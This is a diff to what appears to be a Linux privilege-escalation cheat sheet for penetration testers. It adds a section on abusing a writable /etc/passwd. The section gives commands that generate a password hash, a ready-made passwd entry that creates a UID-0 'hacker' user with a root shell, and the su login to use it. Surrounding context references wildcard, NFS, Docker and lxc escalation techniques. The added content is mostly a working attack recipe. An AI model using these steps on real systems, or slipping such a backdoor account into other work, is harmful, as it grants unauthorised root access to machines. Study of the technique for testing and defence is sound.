@@ -29,6 +29,7 @@
     * [Doas](#doas)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
+* [Writable /etc/passwd](#writable---etc---passwd)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
     * [ldconfig](#ldconfig)
@@ -297,6 +298,27 @@ tar cf archive.tar *
 Tool: [wildpwn](https://github.com/localh0t/wildpwn)
 
 
+## Writable /etc/passwd
+
+First generate a password with one of the following commands
+
+```powershell
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+Then add the user `hacker` and add the generated password.
+
+```powershell
+hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+```
+
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+
+You can now use the `su` command with `hacker:hacker`
+
+
 ## NFS Root Squashing
 
 When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it
@@ -376,7 +398,6 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 }
 ```
 
-
 ## Groups
 
 ### Docker
@@ -439,14 +460,14 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-
 ## References
 
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
-- [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
-- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
+- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
+- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
 - [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
 - [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
 - [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
 - [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
 - [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
+- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
